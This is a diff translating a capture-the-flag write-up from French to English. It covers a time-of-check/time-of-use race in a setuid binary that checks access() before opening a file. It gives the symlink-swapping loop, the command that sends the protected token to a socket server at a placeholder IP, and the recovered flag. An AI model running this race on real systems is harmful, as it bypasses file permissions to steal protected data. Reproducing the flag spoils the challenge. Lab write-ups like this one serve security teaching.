@@ -1,3 +1,8 @@
+In the /home, there is:
+	- level10 (binary executable)
+	- token (txt file containing the flag)
+
+We do not have the rights to read token. The executable ask for a file to send online, but first check if we have rights over it.
 
 nm level10:
 
@@ -21,26 +26,23 @@ nm level10:
          U strerror@@GLIBC_2.0
          U write@@GLIBC_2.0
 
-
-Si on regarde le man de access:
+man access:
 
 Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole,  because  the  user
        might  exploit  the short time interval between checking and opening the file to manipulate it.  For this reason, the use of this system call should be avoided.  (In the
        example just described, a safer alternative would be to temporarily switch the process's effective user ID to the real ID and then call open(2).)
 
-Lien d'aide pour exploiter la faille: https://security.stackexchange.com/a/42661
+More help with the vulnerability: https://security.stackexchange.com/a/42661
 
-On cree un fichier dans /tmp qui contient les droits lecture et ecriture pour nous: echo "salut" > /tmp/salut
+We write a file in /tmp containing a random string. The point is that we have rights on *this* file.
 
-On lance une boucle inf qui va creer un lien symbolique une fois sur le token et la deuxieme fois sur le fichier qu'on a cree. Cela permetra de faire croire a access qu'on a les droits sur le fichier token:
+We create an infinite loop that generate a symbolic link on the token, and then on our file. This will allow the spoofing of access.
 
 while true; do ln -sb ~/token /tmp/tok; ln -sb /tmp/test /tmp/tok; done &
 
-Ensuite on lance le programme comme suit:
+Then, we use this command:
 
 while true; do ./level10 /tmp/tok <ip> | grep -v "You don't have access" | grep -v "Unable to connect to host" ; done &
 
-Pour finir il faut creer le serveur socket qui recupera les donnees: voir fichier serveur.
-
-Le resultat est le suivant:
+Finally, we create a socket server to get the data. The result is :
 	woupa2yuojeeaaed06riuj63c
